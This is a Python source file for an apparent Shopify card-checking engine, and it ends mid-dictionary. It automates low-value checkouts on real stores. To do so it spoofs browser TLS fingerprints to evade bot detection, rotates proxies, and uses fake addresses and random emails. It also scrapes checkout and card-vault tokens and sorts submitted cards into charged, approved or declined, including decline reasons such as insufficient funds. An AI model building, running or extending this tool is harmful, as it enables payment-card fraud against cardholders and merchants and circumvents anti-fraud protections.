# =============================================================================
# checkout_engine.py — API-Less Shopify Checkout Engine (v2.3.1)
# =============================================================================
# Direct Shopify checkout automation. No external API server needed.
# Uses curl_cffi for TLS fingerprint spoofing (required to bypass bot detection).
#
# v2.3.1 (from v2.3.0): fixed missing newline between `pass` and `patterns`
#                        in extract_delivery_handle() that caused SyntaxError.
# =============================================================================

import json
import os
import random
import re
import time
import html
import urllib.parse
import threading
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

from curl_cffi.requests import Session
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("vxo")


# ──────────────────────── redaction ──────────────────────────────────

_REDACT_PATTERNS = [
    (re.compile(r'(\b\d{12,19}\b)'), lambda m: "****" + m.group(1)[-4:]),
    (re.compile(r'("sessionToken"\s*:\s*")([^"]{6})[^"]+'), r'\1\2…'),
    (re.compile(r'("sessionId"\s*:\s*")([^"]{6})[^"]+'),    r'\1\2…'),
    (re.compile(r'("receiptId"\s*:\s*")([^"]{6})[^"]+'),    r'\1\2…'),
    (re.compile(r'("queueToken"\s*:\s*")([^"]{6})[^"]+'),   r'\1\2…'),
    (re.compile(r'(pay_[A-Za-z0-9]{6})[A-Za-z0-9]+'),       r'\1…'),
]


def _redact(s: str) -> str:
    if not s:
        return s
    out = s
    for pat, repl in _REDACT_PATTERNS:
        try:
            out = pat.sub(repl, out)
        except Exception:
            pass
    return out


# ──────────────────────── config ─────────────────────────────────────

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "chrome107",
                    "edge101", "safari15_5", "safari17_0"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

PROXY_POOL: List[str] = []

_GLOBAL_SEM = threading.Semaphore(int(os.environ.get("SHOPIFY_CONCURRENCY", "8")))


# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3


class HardDecline(Exception):
    pass


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False


@dataclass
class Variant:
    id: int
    title: str
    price: str
    available: bool


@dataclass
class Product:
    id: int
    title: str
    variants: List[Variant]


@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"


COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US":     Address("james",    "anderson",   "428 W 45th St",       "Apt 4B",  "New York",      "US", "NY",  "10036",   "+12125550100", "gmail.com"),
    "CA":     Address("john",     "smith",      "200 Kent St",         "",        "Ottawa",        "CA", "ON",  "K1A0G9",  "+16135550100", "gmail.com"),
    "GB":     Address("james",    "wilson",     "10 Downing St",       "",        "London",        "GB", "ENG", "SW1A2AA", "+442012345678","gmail.com"),
    "AU":     Address("thomas",   "taylor",     "1 George St",         "",        "Sydney",        "AU", "NSW", "2000",    "+61212345678", "gmail.com"),
    "DE":     Address("lucas",    "thomas",     "Friedrichstr 100",    "",        "Berlin",        "DE", "BE",  "10117",   "+493012345678","gmail.com"),
    "FR":     Address("hugo",     "bernard",    "10 Rue de Rivoli",    "",        "Paris",         "FR", "IDF", "75001",   "+33112345678", "gmail.com"),
    "IN":     Address("rahul",    "sharma",     "221B Linking Rd",     "",        "Mumbai",        "IN", "MH",  "400001",  "+919876543210","gmail.com"),
    "AE":     Address("ahmed",    "almansouri", "Sheikh Zayed Road 1", "",        "Dubai",         "AE", "DU",  "12345",   "+97141234567", "gmail.com"),
    "IE":     Address("sean",     "murphy",     "1 Grafton St",        "",        "Dublin",        "IE", "D",   "D02Y006", "+35311234567", "gmail.com"),
    "NL":     Address("bas",      "jansen",     "Dam 1",               "",        "Amsterdam",     "NL", "NH",  "1012JS",  "+31201234567", "gmail.com"),
    "NZ":     Address("jack",     "wilson",     "1 Queen St",          "",        "Auckland",      "NZ", "AUK", "1010",    "+6491234567",  "gmail.com"),
    "JP":     Address("takashi",  "yamamoto",   "1-1-1 Marunouchi",    "",        "Tokyo",         "JP", "13",  "1000005", "+81312345678", "gmail.com"),
    "SG":     Address("wei",      "tan",        "1 Raffles Place",     "#01-01",  "Singapore",     "SG", "01",  "048616",  "+6561234567",  "gmail.com"),
    "HK":     Address("chun",     "wong",       "88 Nathan Road",      "Flat 5A", "Kowloon",       "HK", "KLN", "999077",  "+85255555555", "gmail.com"),
    "CH":     Address("hans",     "weber",      "Bahnhofstrasse 1",    "",        "Zurich",        "CH", "ZH",  "8001",    "+41441234567", "gmail.com"),
}

SHIPPING_FALLBACK_ORDER = ["US", "CA", "GB", "AU", "DE", "FR", "NL", "IE", "NZ"]

EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
FIRST_NAMES   = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles","mary","patricia","jennifer","linda","elizabeth","barbara","susan","jessica","sarah","karen"]
LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez","anderson","taylor","thomas","moore","jackson","martin","lee","white","harris","clark"]


def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"


def address_for_country(country: str) -> Address:
    c = (country or "").upper()
    if c in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[c]
    if "-" in c:
        base = c.split("-")[0]
        if base in COUNTRY_ADDRESSES:
            return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]


def pick_address_for_store(shop_url: str, currency: str = "USD", country_hint: str = "") -> Address:
    CURRENCY_TO_COUNTRY = {
        "USD": "US", "CAD": "CA", "GBP": "GB", "AUD": "AU",
        "EUR": "DE", "INR": "IN", "AED": "AE", "CHF": "CH",
        "HKD": "HK", "NZD": "NZ", "SGD": "SG", "JPY": "JP",
    }
    tld = (urllib.parse.urlparse(shop_url).hostname or "").split(".")[-1].upper()
    TLD_MAP = {
        "US": "US", "CA": "CA", "UK": "GB", "AU": "AU",
        "DE": "DE", "FR": "FR", "IN": "IN", "AE": "AE",
        "NZ": "NZ", "IE": "IE", "NL": "NL", "JP": "JP",
        "SG": "SG", "HK": "HK", "CH": "CH",
    }
    for candidate in (
        TLD_MAP.get(tld, ""),
        CURRENCY_TO_COUNTRY.get(currency.upper(), ""),
        country_hint.upper(),
        "US",
    ):
        if candidate and candidate in COUNTRY_ADDRESSES:
            return COUNTRY_ADDRESSES[candidate]
    return COUNTRY_ADDRESSES["US"]


def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result


# ──────────────────────── REAL-CHARGE VERIFIER ───────────────────────

def is_real_charge(poll_body: str) -> Tuple[bool, str]:
    try:
        data = json.loads(poll_body)
    except Exception:
        return False, ""
    receipt = (data.get("data") or {}).get("receipt") or {}
    if not receipt:
        return False, ""
    po = receipt.get("purchaseOrder")
    if not po:
        return False, ""
    total_paid = (
        ((po.get("totalAmountToPay") or {}).get("amount"))
        or ((po.get("checkoutTotal") or {}).get("amount"))
        or ""
    )
    if not total_paid or total_paid in ("0.00", "0", "0.0"):
        return False, ""
    conf = receipt.get("confirmationPage") or {}
    conf_url = conf.get("url") or "" if isinstance(conf, dict) else ""
    if conf_url and "/orders/" in conf_url:
        return True, conf_url
    osp = receipt.get("orderStatusPageUrl") or ""
    if osp and "/orders/" in osp:
        return True, osp
    order_obj = receipt.get("order") or {}
    order_gid = order_obj.get("id") or "" if isinstance(order_obj, dict) else ""
    if not order_gid:
        order_gid = receipt.get("orderId") or ""
    if isinstance(order_gid, str) and order_gid.startswith("gid://shopify/Order/"):
        return True, conf_url or osp or ""
    if total_paid and (po.get("orderNumber") or po.get("name") or po.get("id")):
        return True, conf_url or osp or ""
    return False, ""


# ──────────────────────── Proxy helpers ──────────────────────────────

def normalize_proxy(raw: str) -> str:
    if not raw or not raw.strip():
        raise Exception("empty proxy")

    p = raw.strip()
    for prefix in ("/addproxy", "addproxy", "/proxy", "proxy"):
        if p.lower().startswith(prefix + " "):
            p = p[len(prefix):].strip()
            break
        if p.lower() == prefix:
            raise Exception("empty proxy (command only)")

    p = p.split()[0] if p else ""
    if not p:
        raise Exception("empty proxy after parsing")

    if "://" in p:
        parsed = urllib.parse.urlparse(p)
        if not parsed.hostname or not parsed.port:
            raise Exception(f"invalid proxy URL: {raw!r}")
        return p

    if "@" in p:
        return "http://" + p

    parts = p.split(":")
    if len(parts) == 2:
        host, port = parts
        if not host or not port.isdigit():
            raise Exception(f"invalid proxy: {raw!r}")
        return f"http://{host}:{port}"
    if len(parts) == 4:
        host, port, user, pw = parts
        if not host or not port.isdigit():
            raise Exception(f"invalid proxy: {raw!r}")
        return f"http://{user}:{pw}@{host}:{port}"

    raise Exception(f"unsupported proxy format: {raw!r}")


_PROXY_HEALTH_CACHE: Dict[str, float] = {}
_PROXY_HEALTH_LOCK = threading.Lock()
_PROXY_HEALTH_TTL = 300


def is_proxy_alive(proxy_url: str, timeout: float = 6.0) -> bool:
    if not proxy_url:
        return True
    now = time.time()
    with _PROXY_HEALTH_LOCK:
        cached_at = _PROXY_HEALTH_CACHE.get(proxy_url)
        if cached_at and abs(now - abs(cached_at)) < _PROXY_HEALTH_TTL:
            return cached_at > 0

    alive = False
    try:
        with Session(proxy=proxy_url, impersonate="chrome124", timeout=timeout) as s:
            r = s.head("https://cdn.shopify.com/", timeout=timeout)
            alive = 200 <= r.status_code < 400
    except Exception:
        alive = False

    with _PROXY_HEALTH_LOCK:
        _PROXY_HEALTH_CACHE[proxy_url] = now if alive else -now
    return alive


def pick_next_proxy(current_proxy: str = "") -> str:
    if not PROXY_POOL:
        return current_proxy
    candidates = [p for p in PROXY_POOL if p != current_proxy] or PROXY_POOL
    return random.choice(candidates)


def _load_proxy_pool_from_env() -> None:
    raw = os.environ.get("PROXY_POOL", "").strip()
    if not raw:
        return
    for entry in raw.split(","):
        entry = entry.strip()
        if not entry:
            continue
        try:
            PROXY_POOL.append(normalize_proxy(entry))
        except Exception as exc:
            logger.warning("PROXY_POOL: skipping invalid entry %r (%s)", entry, exc)
    if PROXY_POOL:
        logger.info("PROXY_POOL loaded: %d proxies", len(PROXY_POOL))


# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=30, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        self.proxy_url = proxy_url or ""
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent = user_agent
        _session_kwargs = {"impersonate": impersonate, "timeout": timeout}
        if self.proxy_url:
            _session_kwargs["proxy"] = self.proxy_url
        self.session = Session(**_session_kwargs)
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        with _GLOBAL_SEM:
            return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        with _GLOBAL_SEM:
            return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        try:
            self.session.close()
        except Exception:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()


# ──────────────────────── Step 0: cheapest product ───────────────────

_recent_prices: Dict[str, List[str]] = {}
_recent_prices_lock = threading.Lock()


def _shuffle_pick_variant(candidates: List[Dict], domain: str) -> Dict:
    if len(candidates) <= 1:
        return candidates[0]
    with _recent_prices_lock:
        recent = _recent_prices.get(domain, [])
        preferred = [v for v in candidates if v["price"] not in recent]
        pick = random.choice(preferred) if preferred else random.choice(candidates)
        updated = list(recent) + [pick["price"]]
        _recent_prices[domain] = updated[-5:]
    return pick


def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.50,
                          max_price: float = 5.00) -> Tuple[str, str, str, str]:
    domain = urllib.parse.urlparse(shop_url).hostname or shop_url
    url = f"{shop_url}/products.json?limit=250"
    _RETRYABLE = {500, 502, 503, 504}
    resp = None
    last_err: Optional[Exception] = None

    for attempt in range(1, 4):
        try:
            resp = client.get(url)
        except Exception as exc:
            last_err = exc
            logger.warning("find_cheapest_product attempt %d/3 network error: %r", attempt, exc)
            if attempt < 3:
                time.sleep(2 + random.random() * 3)
            continue

        if resp.status_code == 200:
            break

        if resp.status_code == 429:
            ra = resp.headers.get("Retry-After")
            try:
                wait = int(ra) if ra and str(ra).isdigit() else 5 + random.random() * 3
            except Exception:
                wait = 5 + random.random() * 3
            wait = min(wait, 30) + random.random()
            logger.warning("find_cheapest_product attempt %d/3: HTTP 429, sleeping %.1fs", attempt, wait)
            last_err = Exception("HTTP 429")
            if attempt < 3:
                time.sleep(wait)
            continue

        if resp.status_code in _RETRYABLE:
            last_err = Exception(f"HTTP {resp.status_code}")
            logger.warning("find_cheapest_product attempt %d/3: HTTP %s", attempt, resp.status_code)
            if attempt < 3:
                time.sleep(2 + random.random() * 3)
            continue

        body_snip = (resp.text or "")[:200].replace("\n", " ")
        raise Exception(f"products.json returned {resp.status_code} (body: {body_snip!r})")
    else:
        raise Exception(f"products.json failed after 3 attempts: {last_err}")

    if resp is None or resp.status_code != 200:
        raise Exception(f"products.json unavailable: {last_err}")

    try:
        products = resp.json().get("products", [])
    except Exception as exc:
        raise Exception(f"products.json: invalid JSON ({exc})")

    if not products:
        raise Exception("No products returned from store")

    in_range: List[Dict] = []
    fallback: List[Dict] = []

    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False:
                continue
            if v.get("inventory_quantity") is not None and v["inventory_quantity"] <= 0:
                continue
            try:
                price_f = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price_f < min_price:
                continue
            entry = {
                "variant_id": str(v["id"]),
                "product_id": str(p["id"]),
                "title": p.get("title", ""),
                "price": v.get("price", ""),
                "price_f": price_f,
            }
            if price_f <= max_price:
                in_range.append(entry)
            fallback.append(entry)

    fallback.sort(key=lambda x: x["price_f"])
    candidates = in_range if in_range else fallback
    if not candidates:
        raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")

    pick = _shuffle_pick_variant(candidates, domain)
    return pick["title"], pick["product_id"], pick["variant_id"], pick["price"]


# ──────────────────────── Step 1: cart → checkout ────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp = client.get(cart_permalink, allow_redirects=True, headers={
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": shop_url + "/",
        "sec-ch-ua": '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
    })
    if checkout_resp.status_code not in (200, 302):
        body_snip = (checkout_resp.text or "")[:200].replace("\n", " ")
        raise Exception(
            f"cart permalink returned {checkout_resp.status_code} "
            f"(final_url={checkout_resp.url!r}, body={body_snip!r})"
        )
    checkout_url = checkout_resp.url
    checkout_html = checkout_resp.text
    token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""
    session_match = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token = html.unescape(session_match.group(1)).strip('"') if session_match else ""
    if not checkout_url or "/checkouts/" not in checkout_url:
        raise Exception(f"cart permalink did not redirect to checkout (final_url={checkout_url!r})")
    return checkout_url, checkout_token, session_token, checkout_html


# ──────────────────────── Step 2: private access token ───────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return match.group(1) if match else ""


def fetch_private_access_token(client: TLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"


# ──────────────────────── Step 3: actions JS ─────────────────────────

def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    match = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    return shop_url + match.group(1) if match else ""


def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text


def extract_proposal_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    return match.group(1) if match else ""


def extract_submit_for_completion_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    return match.group(1) if match else ""


def extract_poll_for_receipt_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""


# ──────────────────────── Extraction helpers ─────────────────────────

def extract_queue_token(proposal_json: str) -> str:
    match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return match.group(1) if match else ""


def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True


def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    return match.group(1) if match else ""


def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return match.group(1) if match else ""


def extract_source_token(checkout_html: str) -> str:
    match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(match.group(1)).strip('"') if match else ""


def extract_identification_signature(checkout_html: str) -> str:
    unescaped = checkout_html.replace('&quot;', '"')
    for pattern in [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
        r'cardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pattern, unescaped)
        if m:
            return m.group(1)
    return ""


def extract_vault_url(checkout_html: str) -> str:
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', decoded)
    if m:
        return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""


def extract_vault_domain(checkout_html: str) -> str:
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', decoded)
    if m:
        return m.group(1)
    return ""


def extract_pci_session_id(pci_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return match.group(1) if match else ""


def extract_delivery_handle(proposal_body: str) -> str:
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        dlv = seller.get("delivery", {})
        h = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
        if h:
            return h
        h = dlv.get("deliveryStrategyHandle", "")
        if h:
            return h
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                handles = macro.get("deliveryStrategyHandles", [])
                if handles:
                    return handles[0]
    except Exception:
        pass

    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"',
        r'"handle"\s*:\s*"([a-f0-9\-]{20,})"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            return match.group(1)
    return ""


def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        de = seller.get("deliveryExpectations", {})
        de_typename = de.get("__typename", "")
        if de_typename == "FilledDeliveryExpectationTerms":
            handles = [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]
            if handles:
                return handles
            handles = [x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                       for x in de.get("deliveryExpectations", [])
                       if x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
            if handles:
                return handles
        dlv = seller.get("delivery", {})
        if dlv.get("__typename") == "FilledDeliveryTerms" or de_typename == "FilledDeliveryTerms":
            return []
        if "deliveryExpectations" in de:
            expectations = de.get("deliveryExpectations", [])
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                           for x in expectations
                           if x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
                if handles:
                    return handles
        if de_typename in ["UnfilledDeliveryExpectationTerms", "UnavailableTerms", "PendingTerms"]:
            return []
    except Exception:
        pass
    return []


def extract_shipping_amount(proposal_body: str) -> str:
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        delivery = seller.get("delivery", {})
        for line in delivery.get("deliveryLines", []):
            selected = line.get("selectedDeliveryStrategy", {}).get("handle")
            for strat in line.get("availableDeliveryStrategies", []):
                if strat.get("handle") == selected:
                    amt = strat.get("amount", {}).get("value", {}).get("amount")
                    if amt:
                        return amt
    except Exception:
        pass
    m = re.search(
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body,
    )
    return m.group(1) if m else ""


def extract_checkout_total(proposal_body: str) -> str:
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        for key in ("checkoutTotal", "runningTotal", "total"):
            node = seller.get(key)
            if isinstance(node, dict):
                amt = node.get("value", {}).get("amount") if "value" in node else node.get("amount")
                if amt:
                    return amt
    except Exception:
        pass
    m = re.search(
        r'"sellerProposal".*?"checkoutTotal"\s*:\s*\{[^}]*?"value"\s*:\s*\{[^}]*?"amount"\s*:\s*"([^"]+)"',
        proposal_body, re.DOTALL,
    )
    return m.group(1) if m else ""


def extract_seller_total(proposal_body: str) -> str:
    m = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {}).get("session", {}).get("negotiate", {})
                   .get("result", {}).get("sellerProposal", {})
                   .get("runningTotal", {}).get("value", {}))
        return val.get("amount", "")
    except Exception:
        return ""


def extract_seller_merchandise_price(proposal_body: str) -> str:
    match = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""


def extract_seller_currency(proposal_body: str) -> str:
    match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""


def extract_seller_country(proposal_body: str) -> str:
    match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""


def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {}).get("session", {}).get("negotiate", {})
                   .get("result", {}).get("sellerProposal", {})
                   .get("tax", {}).get("totalTaxAmount", {}).get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"


def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {}).get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        return (seller.get("tax", {})
                      .get("totalTaxAmount", {})
                      .get("value", {})
                      .get("amount", "0.0"))
    except Exception:
        return "0.0"


def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {}).get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""


def extract_receipt_id(submit_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return match.group(1) if match else ""


def extract_receipt_session_token(submit_body: str) -> str:
    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""


def extract_payment_method_id(proposal_body: str) -> str:
    match = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"', proposal_body)
    return match.group(1) if match else ""


# ──────────────────────── Error mapping & extraction ─────────────────

_SHOPIFY_ERROR_MAP: Dict[str, str] = {
    "risky": "RISK_REJECTED", "risk": "RISK_REJECTED", "fraud": "RISK_REJECTED",
    "suspected fraud": "RISK_REJECTED",
    "do not honor": "DO_NOT_HONOR", "do_not_honor": "DO_NOT_HONOR",
    "insufficient funds": "INSUFFICIENT_FUNDS", "insufficient_funds": "INSUFFICIENT_FUNDS",
    "card declined": "CARD_DECLINED", "card_declined": "CARD_DECLINED",
    "invalid card": "CARD_INVALID", "invalid_card": "CARD_INVALID",
    "expired card": "CARD_EXPIRED", "card expired": "CARD_EXPIRED",
